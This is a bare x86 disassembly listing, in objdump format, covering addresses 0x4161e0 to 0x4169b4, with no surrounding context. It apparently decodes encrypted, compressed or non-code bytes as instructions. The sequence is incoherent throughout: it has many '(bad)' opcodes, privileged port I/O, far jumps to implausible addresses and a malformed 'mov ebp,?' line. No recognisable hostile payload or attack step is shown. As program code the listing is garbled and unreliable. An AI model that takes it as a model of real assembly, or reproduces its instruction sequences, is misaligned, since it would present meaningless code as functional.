  4161e0:	gs jns 0x4161bf
  4161e3:	cmp    edx,DWORD PTR [ebx+0x67]
  4161e6:	sar    BYTE PTR [ebx-0x7ac54677],1
  4161ec:	daa    
  4161ed:	xchg   esp,eax
  4161ee:	outs   dx,DWORD PTR ds:[esi]
  4161ef:	pop    ecx
  4161f0:	jne    0x4161a2
  4161f2:	cmp    al,0x5b
  4161f4:	int    0x87
  4161f6:	adc    BYTE PTR [edi+0x1a],al
  4161f9:	shl    cl,0x9
  4161fc:	lods   eax,DWORD PTR ds:[esi]
  4161fd:	stos   BYTE PTR es:[edi],al
  4161fe:	push   esi
  4161ff:	mov    bl,0xc3
  416201:	out    dx,al
  416202:	test   BYTE PTR [ebx+0x36462d4f],0x9f
  416209:	cmp    edx,0x12
  41620c:	xchg   edx,eax
  41620d:	mov    dl,0xf3
  416210:	mov    edx,0x726d6585
  416215:	out    dx,eax
  416216:	mov    ah,0x88
  416218:	add    edi,edx
  41621a:	or     al,0xe9
  41621c:	fstp   QWORD PTR [esi-0x7f]
  41621f:	lods   al,BYTE PTR ds:[esi]
  416220:	ja     0x4161bb
  416222:	sbb    al,0x77
  416224:	fmul   DWORD PTR [ecx-0x73]
  416227:	xor    al,0x1d
  416229:	outs   dx,DWORD PTR ds:[esi]
  41622a:	lods   eax,DWORD PTR ds:[esi]
  41622b:	mov    gs,WORD PTR [edx+0x3a]
  41622e:	rcl    BYTE PTR [esi],cl
  416230:	loop   0x416225
  416232:	adc    BYTE PTR [edx],0x70
  416235:	neg    DWORD PTR [ebp-0x7cf37907]
  41623b:	repz fidivr WORD PTR [ecx-0x3]
  41623f:	test   al,0xa4
  416241:	push   cs
  416242:	add    BYTE PTR [edi],bl
  416244:	fsub   QWORD PTR [edi]
  416246:	inc    ebx
  416247:	sbb    DWORD PTR [edi+0x6c],ebp
  41624a:	lahf   
  41624b:	pop    ss
  41624c:	mov    ch,0xe0
  41624e:	mov    ebp,0x7e90bef9
  416253:	pop    ss
  416254:	addr16 sub al,0x30
  416257:	mov    edi,0x5c7427e1
  41625c:	mul    BYTE PTR [ebp+0x13d54da4]
  416262:	aad    0xf5
  416264:	sub    al,0xc6
  416266:	mov    ds:0x315c2ff,eax
  41626b:	dec    esp
  41626c:	mov    edx,0xa9667aa0
  416271:	push   ecx
  416272:	jl     0x4162b0
  416274:	js     0x416255
  416276:	popf   
  416277:	mov    bl,0x6b
  416279:	pop    ebp
  41627a:	clc    
  41627b:	ret    0x6b90
  41627e:	sahf   
  41627f:	cld    
  416280:	sub    DWORD PTR [edx],0xd6e1dbb2
  416286:	xchg   edx,eax
  416287:	mov    ds:0x6d24c0fa,eax
  41628c:	sub    al,0xa2
  41628e:	out    0xa4,al
  416290:	mov    BYTE PTR [ebp-0x44fc2d65],dl
  416296:	les    edi,FWORD PTR [eax]
  416298:	dec    ecx
  416299:	xchg   edi,eax
  41629a:	imul   esi,eax,0xffffffe4
  41629d:	addr16 push esp
  41629f:	jns    0x4162f2
  4162a1:	cmc    
  4162a2:	test   eax,0x323ec217
  4162a7:	xor    bh,cl
  4162a9:	inc    ebx
  4162aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162ab:	add    esi,ecx
  4162ad:	test   eax,0x437c23fc
  4162b2:	mov    esp,0x68681f1e
  4162b7:	push   edx
  4162b8:	jle    0x41631a
  4162ba:	jp     0x416264
  4162bc:	jecxz  0x416246
  4162be:	mov    bh,0xd
  4162c0:	paddusw mm6,QWORD PTR [esp+esi*2]
  4162c4:	lock mov esi,0x479da34f
  4162ca:	data16 fwait
  4162cc:	rcr    DWORD PTR [edx+0x64fdc03d],1
  4162d2:	jle    0x41632b
  4162d4:	sub    al,0x5a
  4162d6:	ror    DWORD PTR [ecx+0x2d67ea2f],1
  4162dc:	lahf   
  4162dd:	mov    ds:0xc2a4d3,al
  4162e2:	push   eax
  4162e3:	mov    edx,0x8e6195f5
  4162e8:	mov    ds:0x8e829018,al
  4162ed:	jle    0x41628f
  4162ef:	das    
  4162f0:	sub    al,0x83
  4162f2:	(bad)  [eax+ebx*8]
  4162f5:	(bad)  
  4162f6:	pop    eax
  4162f7:	pop    eax
  4162f8:	dec    eax
  4162f9:	imul   DWORD PTR ds:0xedb25ca3
  4162ff:	sub    ch,BYTE PTR [edx-0x15554d04]
  416305:	sub    eax,0x228bd037
  41630a:	add    BYTE PTR [edx+0x6],cl
  41630d:	test   eax,0xe53f776e
  416312:	aas    
  416313:	test   eax,0x836dde20
  416318:	outs   dx,BYTE PTR ds:[esi]
  416319:	or     ch,BYTE PTR [edx-0x46]
  41631c:	sub    al,0xe1
  41631e:	jg     0x41636a
  416320:	mov    cx,ds
  416323:	(bad)  
  416324:	(bad)  
  416326:	pop    es
  416327:	sub    BYTE PTR [esi],0x65
  41632a:	stos   DWORD PTR es:[edi],eax
  41632b:	xor    al,0xd4
  41632d:	add    BYTE PTR [eax-0x1e38040d],bh
  416333:	sub    BYTE PTR [edx+0x5e],cl
  416336:	cmp    BYTE PTR [ecx],0x7b
  416339:	mov    ebx,0x8cb25385
  41633e:	add    dl,BYTE PTR [ecx+eax*4+0x13]
  416342:	ficomp DWORD PTR [ebp+0x41]
  416345:	jne    0x41633b
  416347:	sbb    eax,0xca0c6951
  41634c:	xlat   BYTE PTR ds:[ebx]
  41634d:	fadd   DWORD PTR [ebx+0x54]
  416350:	jo     0x416350
  416352:	sbb    al,0x7
  416354:	sbb    BYTE PTR [esi],dl
  416356:	or     BYTE PTR [edx],cl
  416358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416359:	jl     0x41633d
  41635b:	jmp    0x40cdddfe
  416360:	mov    cl,0x9
  416362:	ja     0x416322
  416364:	push   edi
  416365:	int3   
  416366:	test   BYTE PTR [eax],dl
  416368:	jmp    0x4162ea
  41636a:	xor    DWORD PTR [eax],0x2ff62e6a
  416370:	mov    eax,ds:0x62c0dece
  416375:	sub    bh,BYTE PTR [si-0x4aa]
  41637a:	jno    0x41633f
  41637c:	repnz fimul WORD PTR [edx]
  41637f:	std    
  416380:	ja     0x416317
  416382:	lods   al,BYTE PTR ds:[esi]
  416383:	mov    eax,ds:0x84329791
  416388:	push   edx
  416389:	es js  0x4163bc
  41638c:	add    cl,bl
  41638e:	inc    esi
  41638f:	sub    eax,DWORD PTR [esi-0x3453e0af]
  416395:	jo     0x416389
  416397:	fcom   st(5)
  41639a:	and    ecx,ecx
  41639c:	and    eax,0xce506d44
  4163a1:	cmp    BYTE PTR [esi-0xd],dh
  4163a4:	(bad)  
  4163a6:	jmp    DWORD PTR [edi+0x5]
  4163a9:	nop
  4163aa:	sub    al,0x73
  4163ac:	adc    ecx,DWORD PTR [ecx-0x7b]
  4163af:	mov    ds:0x41d048cc,al
  4163b4:	ins    BYTE PTR es:[edi],dx
  4163b5:	sbb    edx,DWORD PTR [edi]
  4163b7:	jnp    0x41636e
  4163b9:	mov    esp,0xf8ece657
  4163be:	fwait
  4163bf:	xlat   BYTE PTR ds:[ebx]
  4163c0:	mov    al,ds:0x20629976
  4163c5:	pushf  
  4163c6:	pop    es
  4163c7:	ss push ebx
  4163c9:	pop    eax
  4163ca:	add    al,BYTE PTR [ecx+0x23453a8f]
  4163d0:	adc    bh,cl
  4163d2:	rol    bl,0x31
  4163d5:	lock sub al,0x6e
  4163d8:	pop    es
  4163d9:	push   edi
  4163da:	call   FWORD PTR [esi-0x7f]
  4163dd:	or     al,BYTE PTR [ebp-0xef7b7ab]
  4163e3:	sbb    DWORD PTR [edi-0x254abab],esi
  4163e9:	mov    ebp,?
  4163eb:	and    bh,dh
  4163ed:	pop    ebp
  4163ee:	add    BYTE PTR [edx],ah
  4163f0:	push   ss
  4163f1:	mov    ecx,0xe674683d
  4163f6:	data16 outs dx,BYTE PTR ds:[esi]
  4163f8:	mov    ebx,0x719648a1
  4163fd:	lods   eax,DWORD PTR ds:[esi]
  4163fe:	pop    ds
  4163ff:	jne    0x41641f
  416401:	inc    edx
  416402:	adc    ebx,DWORD PTR ds:0x25cbd397
  416408:	and    DWORD PTR [edx+0x2db3eaf7],ecx
  41640e:	lahf   
  41640f:	test   DWORD PTR [edx-0x13],edx
  416412:	out    0xab,al
  416414:	aam    0x86
  416416:	fsubrp st(4),st
  416418:	imul   ecx,DWORD PTR [ebp+ecx*4+0x2d6021f0],0x37
  416420:	stc    
  416421:	(bad)  
  416422:	dec    ebx
  416423:	ins    BYTE PTR es:[edi],dx
  416424:	in     eax,dx
  416425:	lods   al,BYTE PTR ds:[esi]
  416426:	inc    ebp
  416427:	cld    
  416428:	xchg   ebx,eax
  416429:	mov    edx,0x2837c380
  41642e:	iret   
  41642f:	lds    ebx,FWORD PTR [edx]
  416431:	push   edx
  416432:	and    eax,0x627a23a0
  416437:	fwait
  416438:	call   eax
  41643a:	push   ebp
  41643b:	mov    dh,0xb9
  41643d:	(bad)  
  41643e:	adc    edi,DWORD PTR [eax+ebx*8+0x4b8578c9]
  416445:	fimul  WORD PTR [edx-0x9c4b101]
  41644b:	mov    DWORD PTR [edx+0x5f],esp
  41644e:	mov    ecx,edi
  416450:	hlt    
  416451:	add    ebp,DWORD PTR [ecx]
  416453:	cmp    DWORD PTR [ebp+0x0],ebx
  416456:	and    BYTE PTR [ebx-0x7a2b2465],bh
  41645c:	dec    edi
  41645d:	outs   dx,DWORD PTR ds:[esi]
  41645e:	add    eax,edi
  416460:	fucom  st(5)
  416462:	xchg   esp,eax
  416463:	cmc    
  416464:	aam    0x2a
  416466:	pop    ds
  416467:	test   eax,0x444874b2
  41646c:	hlt    
  41646d:	inc    ebp
  41646e:	mov    WORD PTR [edi],ss
  416470:	icebp  
  416471:	adc    BYTE PTR ds:0x87babb2e,bh
  416477:	bound  edx,QWORD PTR [ecx]
  416479:	inc    edx
  41647a:	enter  0xe0bd,0xe4
  41647e:	pushf  
  41647f:	shr    bl,cl
  416481:	add    eax,esp
  416483:	or     eax,0x1f64232a
  416488:	(bad)  
  416489:	jmp    0x8ad1:0xc415a40a
  416490:	outs   dx,BYTE PTR ds:[esi]
  416491:	popf   
  416492:	test   DWORD PTR [ecx-0x2b18cfb2],0x555f6383
  41649c:	mov    esi,0x2aa475eb
  4164a1:	jmp    0x4164f2
  4164a3:	xchg   ebx,eax
  4164a4:	in     al,0xc8
  4164a6:	stos   BYTE PTR es:[edi],al
  4164a7:	fwait
  4164a8:	aaa    
  4164a9:	lds    edx,FWORD PTR [eax+ebp*8]
  4164ac:	mov    eax,ds:0x6888bdf8
  4164b1:	sub    ch,BYTE PTR [edx-0x1b]
  4164b4:	dec    ebx
  4164b5:	push   edi
  4164b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164b7:	pop    esp
  4164b8:	sub    al,BYTE PTR [edi+edi*2-0x3a]
  4164bc:	and    cl,BYTE PTR [ebx+0x3f09a217]
  4164c2:	cwde   
  4164c3:	data16 fs jo 0x41644e
  4164c7:	dec    esp
  4164c8:	pop    edx
  4164c9:	adc    eax,ebx
  4164cb:	pop    ds
  4164cc:	pop    esp
  4164cd:	cmp    DWORD PTR [ebx],ebp
  4164cf:	lods   al,BYTE PTR ds:[esi]
  4164d0:	rol    BYTE PTR [esi+0x7d4d2ad],cl
  4164d6:	push   ds
  4164d7:	and    ebx,ebp
  4164d9:	inc    ebx
  4164da:	jb     0x4164c2
  4164dc:	mov    ebp,0xf3cac5d3
  4164e1:	retf   0xb6ca
  4164e4:	add    edi,DWORD PTR [ecx-0x21706f8d]
  4164ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164eb:	jmp    0x9f07998d
  4164f0:	jb     0x416521
  4164f2:	inc    esi
  4164f3:	xor    eax,0xebcc5bd1
  4164f8:	scas   eax,DWORD PTR es:[edi]
  4164f9:	sub    eax,0x1ac6e28d
  4164fe:	cmp    eax,0xf3e266cd
  416503:	jne    0x4164b4
  416505:	jae    0x416567
  416507:	stos   DWORD PTR es:[edi],eax
  416508:	mov    eax,ds:0xc61e34f1
  41650d:	dec    ecx
  41650e:	mov    ecx,0xdd15094f
  416514:	idiv   BYTE PTR [edi-0x22]
  416517:	dec    edx
  416518:	call   ebp
  41651a:	addr16 xor eax,0x4d7fb467
  416520:	mov    BYTE PTR [eax],bh
  416522:	cli    
  416523:	xchg   edi,eax
  416524:	lods   eax,DWORD PTR ds:[esi]
  416525:	inc    eax
  416526:	cs add eax,esp
  416529:	sub    DWORD PTR [edx-0x28e18971],edx
  41652f:	daa    
  416530:	outs   dx,DWORD PTR ds:[esi]
  416531:	out    0xe0,eax
  416533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416534:	and    eax,0x2eb2340c
  416539:	inc    eax
  41653a:	ins    DWORD PTR es:[edi],dx
  41653b:	push   0xffffff8e
  41653d:	mov    esp,0x473fe9de
  416542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416543:	pushf  
  416544:	mov    dl,0x5
  416546:	xchg   BYTE PTR [eax-0x5],dl
  416549:	arpl   di,di
  41654b:	std    
  41654c:	cmp    BYTE PTR [ebp-0x5e9eabce],cl
  416552:	jl     0x4165bb
  416554:	xchg   edx,eax
  416555:	mov    esi,0x7774e8f8
  41655a:	fmul   DWORD PTR [ebx-0x3e]
  41655d:	inc    ebx
  41655e:	and    eax,0x3e80610c
  416563:	repz jp 0x41650c
  416566:	mov    esp,0x8b746ab
  41656b:	pop    esi
  41656c:	(bad)  
  41656d:	cwde   
  41656e:	mov    dh,0x20
  416570:	xor    ah,al
  416572:	gs dec eax
  416574:	bound  esi,QWORD PTR [esp+ebx*2+0x1206a2f2]
  41657b:	sbb    BYTE PTR ds:0xb967250f,0x4d
  416582:	mov    fs,WORD PTR [esi-0x5b994584]
  416588:	xchg   ecx,eax
  416589:	pop    edi
  41658a:	add    BYTE PTR ds:[ecx+ecx*1-0x38],dl
  41658f:	pushaw 
  416591:	js     0x416514
  416593:	push   ss
  416594:	ja     0x41657b
  416596:	lds    edx,FWORD PTR [edx]
  416598:	pop    edx
  416599:	dec    esp
  41659a:	dec    esi
  41659b:	(bad)  
  41659c:	into   
  41659d:	xor    eax,0x3c77e7f4
  4165a2:	push   esi
  4165a3:	sub    esp,esi
  4165a5:	js     0x41655c
  4165a7:	lods   eax,DWORD PTR ds:[esi]
  4165a8:	addr16 push ecx
  4165aa:	dec    esp
  4165ab:	xor    bl,0x87
  4165ae:	fldenv [ebx+0x8]
  4165b1:	push   cs
  4165b2:	idiv   BYTE PTR [ebx-0x66]
  4165b5:	add    edx,DWORD PTR ss:[ebp-0x31]
  4165b9:	je     0x4165d3
  4165bb:	push   ebp
  4165bc:	adc    eax,0xf4aae30c
  4165c1:	dec    eax
  4165c2:	aad    0x58
  4165c4:	rcl    DWORD PTR [edi+edi*4],1
  4165c7:	sbb    bl,BYTE PTR [ebx+0x9]
  4165ca:	pushf  
  4165cb:	mov    eax,gs
  4165cd:	sbb    al,0xa4
  4165cf:	mov    ah,0x7e
  4165d1:	jl     0x4165d6
  4165d3:	sub    BYTE PTR [eax+0x7a],bh
  4165d6:	lock inc ecx
  4165d8:	stos   DWORD PTR es:[edi],eax
  4165d9:	mov    DWORD PTR [ebp-0x58],0xbdf88fbc
  4165e0:	and    dl,dh
  4165e2:	test   BYTE PTR [ebp+0x75074c52],0x6b
  4165e9:	lea    ebx,[esi+0xe165b2]
  4165ef:	adc    al,0x27
  4165f1:	xchg   ebp,eax
  4165f2:	fmul   QWORD PTR [edi]
  4165f4:	inc    eax
  4165f5:	fbld   TBYTE PTR [ecx+0x513abb15]
  4165fb:	popa   
  4165fc:	(bad)  
  4165fe:	ds pop edx
  416600:	stos   DWORD PTR es:[edi],eax
  416601:	jb     0x4165c9
  416603:	pop    ecx
  416604:	pushf  
  416605:	shl    dh,1
  416607:	inc    ebx
  416608:	bound  esi,QWORD PTR [ebx]
  41660a:	xor    bh,BYTE PTR [esp+esi*2+0x72]
  41660e:	fwait
  41660f:	pop    ds
  416610:	imul   ecx,DWORD PTR [ebp+0x248fff3b],0xffffff9f
  416617:	mov    al,0xfb
  416619:	sbb    eax,0x7f0562cc
  41661e:	inc    cx
  416620:	jl     0x4165dc
  416622:	or     edi,edx
  416624:	icebp  
  416625:	aaa    
  416626:	fs add eax,0x6843de97
  41662c:	and    bl,bl
  41662e:	dec    ecx
  41662f:	mov    eax,ds:0xd90da440
  416634:	scas   eax,DWORD PTR es:[edi]
  416635:	fs pop eax
  416637:	pop    edx
  416638:	outs   dx,BYTE PTR ds:[esi]
  416639:	push   ebx
  41663a:	dec    eax
  41663b:	fcomp  QWORD PTR [eax+edi*8-0x24]
  41663f:	mov    eax,0x29189e50
  416644:	mov    ah,0x97
  416646:	and    eax,0x6e7c6ef2
  41664b:	or     al,0x55
  41664d:	mov    BYTE PTR [esi-0x35],cl
  416650:	xlat   BYTE PTR ds:[ebx]
  416651:	pop    es
  416652:	xchg   ecx,esi
  416654:	push   ecx
  416655:	sbb    DWORD PTR ds:0x3606d48b,0xc6a1ca86
  41665f:	inc    ebx
  416660:	mov    ah,0xf
  416662:	dec    ebx
  416663:	mov    dh,0x42
  416665:	stc    
  416666:	fidiv  DWORD PTR [ebp-0x539b48aa]
  41666c:	icebp  
  41666d:	jp     0x416622
  41666f:	stc    
  416670:	xor    edx,DWORD PTR [ebx]
  416672:	inc    edi
  416673:	and    al,BYTE PTR [edx-0x69086528]
  416679:	loop   0x416623
  41667b:	ds daa 
  41667d:	mov    dh,0x5e
  41667f:	mov    edx,0x586e5f84
  416684:	or     BYTE PTR [esi-0x12ae2708],ch
  41668a:	stc    
  41668b:	adc    DWORD PTR [esi],0xffffffd7
  41668e:	dec    edx
  41668f:	mov    edi,0x9d7fc005
  416694:	loopne 0x416706
  416696:	pop    es
  416697:	cmp    al,bh
  416699:	jecxz  0x416629
  41669b:	add    BYTE PTR [ebp+0x30],dh
  41669e:	lds    esp,FWORD PTR [edi]
  4166a0:	ret    0x3b1
  4166a3:	xchg   esp,eax
  4166a4:	xchg   ebp,eax
  4166a5:	bnd jmp 0x5008c48f
  4166ab:	jg     0x41667e
  4166ad:	fs add eax,0xe012295b
  4166b3:	ja     0x416730
  4166b5:	ja     0x4166d9
  4166b7:	mov    al,ds:0x3d115af
  4166bc:	mov    BYTE PTR [edx+0x21],dl
  4166bf:	jg     0x416657
  4166c1:	out    0x58,eax
  4166c3:	scas   eax,DWORD PTR es:[edi]
  4166c4:	(bad)  
  4166c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166c6:	sub    eax,0xe43aa5b9
  4166cb:	in     eax,0x7c
  4166cd:	imul   ebp,DWORD PTR [edx+0x7a],0x3
  4166d1:	dec    ecx
  4166d2:	(bad)  
  4166d3:	(bad)  
  4166d4:	sbb    dh,BYTE PTR [edi+0x5e7eb512]
  4166da:	scas   eax,DWORD PTR es:[edi]
  4166db:	adc    DWORD PTR cs:[ebx],ebx
  4166de:	pop    ds
  4166df:	mov    dl,0xd8
  4166e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e2:	cmp    BYTE PTR [esi+0xa],0xfc
  4166e6:	cmp    BYTE PTR [edi+esi*8-0x73b37704],cl
  4166ed:	pop    ecx
  4166ee:	or     BYTE PTR [eax],ch
  4166f0:	jle    0x4166fd
  4166f2:	call   0x9ce316f
  4166f7:	mov    eax,ds:0x1ce78fbe
  4166fc:	and    al,0xbf
  4166fe:	pusha  
  4166ff:	jecxz  0x416762
  416701:	adc    ebp,ecx
  416703:	out    0xbb,al
  416705:	adc    DWORD PTR [edi+0x7f44ee43],0x1c45259c
  41670f:	daa    
  416710:	pop    ebp
  416711:	adc    eax,0x26899f30
  416716:	jne    0x4166c3
  416718:	mov    al,ds:0x9434fbe
  41671d:	and    al,0x95
  41671f:	fstp   DWORD PTR [ebp-0x34]
  416722:	out    dx,al
  416723:	xchg   ebp,eax
  416724:	test   DWORD PTR [ebp-0x40],eax
  416727:	pop    ss
  416728:	and    BYTE PTR [edi-0x71b66bb4],dh
  41672e:	fistp  WORD PTR [eax]
  416730:	in     al,dx
  416731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416732:	(bad)  
  416733:	adc    bl,dh
  416735:	jl     0x4166d0
  416737:	enter  0xd92,0x57
  41673b:	arpl   WORD PTR [ecx-0x80],dx
  41673e:	stc    
  41673f:	and    esp,DWORD PTR [ebx+eax*1-0x14]
  416743:	icebp  
  416744:	cmc    
  416745:	xor    eax,0x32eec24a
  41674a:	mov    ebx,0x39e637a7
  41674f:	icebp  
  416750:	mov    bl,0xb1
  416752:	(bad)  
  416753:	call   DWORD PTR [ebp+0x191a1c96]
  416759:	in     al,0x40
  41675b:	pop    es
  41675c:	ret    
  41675d:	dec    BYTE PTR [ecx-0x42c0c22d]
  416763:	(bad)  
  416764:	cld    
  416765:	xor    dh,BYTE PTR [esi]
  416767:	cmp    DWORD PTR [edi+0x15],eax
  41676a:	xor    dh,BYTE PTR ds:0x2d1ff9b2
  416770:	icebp  
  416771:	loopne 0x41675d
  416773:	loopne 0x416754
  416775:	inc    ebx
  416776:	add    DWORD PTR [ecx-0x1d],0x20
  41677a:	mov    cl,0xd0
  41677c:	cmp    ebx,DWORD PTR [esi]
  41677e:	in     al,0x4d
  416780:	mov    bh,0x43
  416782:	sub    dl,BYTE PTR [ebp+0x72]
  416785:	arpl   WORD PTR [esi],dx
  416787:	shr    BYTE PTR [ebx-0x56],1
  41678a:	or     dh,BYTE PTR [ecx]
  41678c:	push   0x7e
  41678e:	xlat   BYTE PTR ds:[ebx]
  41678f:	in     al,dx
  416790:	loope  0x41671a
  416792:	mov    edi,0xec5ce4a7
  416797:	jo     0x416806
  416799:	dec    ebx
  41679a:	mov    eax,ds:0x3cad4b4d
  41679f:	adc    al,0xc7
  4167a1:	inc    edi
  4167a2:	(bad)  
  4167a3:	xchg   ebp,eax
  4167a4:	mov    al,ds:0x224c0053
  4167a9:	inc    edi
  4167aa:	jl     0x41677d
  4167ac:	(bad)
  4167af:	push   0x56ba35e8
  4167b4:	pop    ebx
  4167b5:	data16 outs dx,BYTE PTR ds:[esi]
  4167b7:	cmp    ebx,0x3538d486
  4167bd:	sub    BYTE PTR [eax+0x2de4d18],dh
  4167c3:	xor    al,0x93
  4167c5:	or     cl,BYTE PTR [ebp*1-0x62f5476]
  4167cc:	jb     0x4167fc
  4167ce:	rcl    BYTE PTR [esi-0x51],1
  4167d1:	out    0x53,eax
  4167d3:	retf   
  4167d4:	fcom   DWORD PTR [edi-0x290441ec]
  4167da:	je     0x4167c2
  4167dc:	push   eax
  4167dd:	fcom   DWORD PTR [ecx-0xa47925f]
  4167e3:	mov    al,0xb3
  4167e5:	(bad)  
  4167e6:	adc    edi,DWORD PTR ds:[ecx]
  4167e9:	imul   esi,DWORD PTR [edi+0x35],0x73
  4167ed:	adc    eax,0x45f26e74
  4167f2:	mov    esi,0xbff65e40
  4167f7:	adc    eax,0xbd7d59f6
  4167fc:	outs   dx,BYTE PTR ds:[esi]
  4167fd:	es pop ds
  4167ff:	shl    BYTE PTR ds:0x8eb7fe05,cl
  416805:	adc    al,0xf9
  416807:	xchg   edi,eax
  416808:	xor    BYTE PTR [edi],cl
  41680a:	push   ebx
  41680b:	xchg   esi,eax
  41680c:	xor    esi,DWORD PTR [edx]
  41680e:	test   eax,0x8cb5cc0d
  416813:	iret   
  416814:	mov    ebx,DWORD PTR [esi+0x42a6273a]
  41681a:	icebp  
  41681b:	push   cs
  41681c:	mov    ah,0x22
  41681e:	shr    DWORD PTR [ebx-0x17],0xe5
  416822:	cli    
  416823:	call   0x96f99415
  416828:	mov    ebx,0x1bf7f292
  41682d:	dec    edx
  41682e:	sbb    DWORD PTR [esi],0x30d592be
  416834:	pop    es
  416835:	mov    dl,0x5a
  416837:	push   ebx
  416838:	xchg   DWORD PTR [eax+ebp*8+0x25],ecx
  41683c:	jl     0x416849
  41683e:	aam    0x1c
  416840:	cmp    al,0xeb
  416842:	mov    eax,DWORD PTR [eax-0xf1f771b]
  416848:	mov    al,ds:0xe5959ad0
  41684d:	popf   
  41684e:	and    eax,0x6bd30605
  416853:	mov    esp,DWORD PTR [ebp+0x3ed392f9]
  416859:	outs   dx,DWORD PTR ds:[esi]
  41685a:	fstp   TBYTE PTR [eax+0x71ebb7a9]
  416860:	mov    WORD PTR [ecx+0x7a],ss
  416863:	nop
  416864:	or     BYTE PTR [edi+0xd572174],ch
  41686a:	cmp    al,0x78
  41686c:	mov    eax,0x6bb37a2e
  416871:	push   cs
  416872:	pop    edx
  416873:	sub    ch,bh
  416875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416876:	enter  0x127a,0x4b
  41687a:	inc    eax
  41687b:	cdq    
  41687c:	jg     0x41684e
  41687e:	push   es
  41687f:	out    0xa4,al
  416881:	mov    al,ds:0x9fdb4f8e
  416886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416887:	jge    0x4168e4
  416889:	push   edi
  41688a:	push   edx
  41688b:	popf   
  41688c:	ret    0xb659
  41688f:	push   0xffffff8b
  416891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416892:	scas   al,BYTE PTR es:[edi]
  416893:	out    0x88,eax
  416895:	scas   al,BYTE PTR es:[edi]
  416896:	cli    
  416897:	jg     0x416907
  416899:	cs push ss
  41689b:	shl    DWORD PTR [edx],cl
  41689d:	sub    eax,0x52da8a87
  4168a2:	jmp    0x4168b3
  4168a4:	xchg   esi,eax
  4168a5:	in     al,0x51
  4168a7:	les    eax,FWORD PTR [ecx+0x3addd4b3]
  4168ad:	push   ecx
  4168ae:	and    edi,esi
  4168b0:	sbb    bl,BYTE PTR [eax+0x4d6845b5]
  4168b6:	retf   0x5c75
  4168b9:	aas    
  4168ba:	adc    al,BYTE PTR [ebp+0x117f65c6]
  4168c0:	mov    edx,0xc677f1fb
  4168c5:	popa   
  4168c6:	lods   al,BYTE PTR ds:[esi]
  4168c7:	dec    edx
  4168c8:	push   edx
  4168c9:	cmp    eax,0x847e0955
  4168ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168cf:	xor    ah,bl
  4168d1:	ins    BYTE PTR es:[edi],dx
  4168d2:	adc    al,0xea
  4168d4:	std    
  4168d5:	jl     0x416903
  4168d7:	jbe    0x41687b
  4168d9:	pop    eax
  4168da:	leave  
  4168db:	push   edx
  4168dc:	mov    ah,0x80
  4168de:	stos   BYTE PTR es:[edi],al
  4168df:	int3   
  4168e0:	aas    
  4168e1:	jns    0x416906
  4168e3:	jle    0x41690d
  4168e5:	and    esp,edx
  4168e7:	jmp    0x56da6e37
  4168ec:	(bad)  
  4168ed:	push   ebp
  4168ee:	inc    edi
  4168ef:	ja     0x4168dc
  4168f1:	sub    BYTE PTR [ebp+eax*4+0x7f],0x2c
  4168f6:	jbe    0x416893
  4168f8:	les    ebp,FWORD PTR [ecx+0x68]
  4168fb:	mov    ds:0xcc2786f8,al
  416900:	(bad)  
  416902:	les    eax,FWORD PTR [edi]
  416904:	loopne 0x416981
  416906:	subps  xmm7,XMMWORD PTR [ecx+0x4b5d3e84]
  41690d:	cli    
  41690e:	pop    ebx
  41690f:	jb     0x41691c
  416911:	and    BYTE PTR [eax],0xfe
  416914:	iret   
  416915:	outs   dx,BYTE PTR ds:[esi]
  416916:	cmp    al,0x15
  416918:	ins    BYTE PTR es:[edi],dx
  416919:	sti    
  41691a:	aam    0x4c
  41691c:	fwait
  41691d:	mov    ds:0x7fa004b0,eax
  416922:	jge    0x416972
  416924:	pop    edx
  416925:	adc    BYTE PTR [esi-0xa60136c],dh
  41692b:	and    DWORD PTR [eax],ecx
  41692d:	mov    ecx,0x7c2c29cf
  416932:	and    dh,ah
  416934:	inc    eax
  416935:	dec    esp
  416936:	mov    bh,0xe7
  416938:	jbe    0x4168c3
  41693a:	int    0xca
  41693c:	shl    bl,0x9f
  41693f:	push   esi
  416940:	or     DWORD PTR [ebx-0x43c9a842],esi
  416946:	xchg   DWORD PTR [edx+eiz*1],esi
  416949:	pushf  
  41694a:	cld    
  41694b:	xchg   edi,eax
  41694c:	dec    sp
  41694e:	jecxz  0x416916
  416950:	pop    edx
  416951:	xor    BYTE PTR [ecx-0x7d6352fd],al
  416957:	inc    ecx
  416958:	int    0x14
  41695a:	aad    0xf4
  41695c:	mov    esp,0x447bcc6
  416961:	mov    ch,0x2e
  416963:	pop    ds
  416964:	or     ecx,ebp
  416966:	mov    DWORD PTR [ecx],esi
  416968:	mov    eax,0xee2fa6d0
  41696d:	sub    bh,ah
  41696f:	lods   al,BYTE PTR ds:[esi]
  416970:	xchg   ecx,eax
  416971:	stc    
  416972:	dec    ecx
  416973:	out    0x43,al
  416975:	push   es
  416976:	out    dx,al
  416977:	adc    al,0x3b
  416979:	pop    es
  41697a:	xor    BYTE PTR [edi+0x2215a0d5],bl
  416980:	xchg   esi,ebx
  416982:	sti    
  416983:	inc    BYTE PTR fs:[esi+esi*4-0x4144f7bc]
  41698b:	sub    al,0xc2
  41698d:	pop    ebp
  41698e:	mov    bh,0xf4
  416990:	dec    esp
  416991:	stos   DWORD PTR es:[edi],eax
  416992:	dec    ecx
  416993:	add    ecx,ecx
  416995:	xor    cl,BYTE PTR [esi+ecx*2-0x2e41b2e9]
  41699c:	jno    0x41698a
  41699e:	cmp    BYTE PTR [edx-0x4899f793],dl
  4169a4:	inc    ebx
  4169a5:	push   eax
  4169a6:	js     0x4169f3
  4169a8:	data16 sti 
  4169aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169ab:	ja     0x41696e
  4169ad:	sub    ebp,DWORD PTR [eax-0x594b77fa]
  4169b3:	retf   
  4169b4:	in     eax,0x47
